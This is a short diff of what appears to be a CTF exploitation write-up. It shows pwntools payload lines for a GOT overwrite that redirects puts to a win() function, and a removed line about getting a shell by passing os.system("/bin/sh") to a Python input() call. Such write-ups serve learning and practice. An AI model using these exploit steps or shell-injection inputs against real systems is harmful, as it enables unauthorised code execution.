@@ -62,10 +62,9 @@ payload += p64(0xdeadbeef)
 payload += p64(elf.sym['main']+70)
 p.sendline(payload)
 ```
-With this we can overwrite the GOT PUTS to **win()** function. Because there's `lea, [rbp-0x20]` our value will be substracted with 0x20, just add +0x20 to get the correct value.\
-Full Script:
+With this we can overwrite the GOT PUTS to **win()** function. Because there's `lea, [rbp-0x20]` our value will be substracted with 0x20, just add +0x20 to get the correct value.
 
-The bug is on **input()** at choice 4, because the program already **import os**, then just simply input **os.system("/bin/sh")** to get shell
+Full Script:
 
 ```py
 from pwn import *
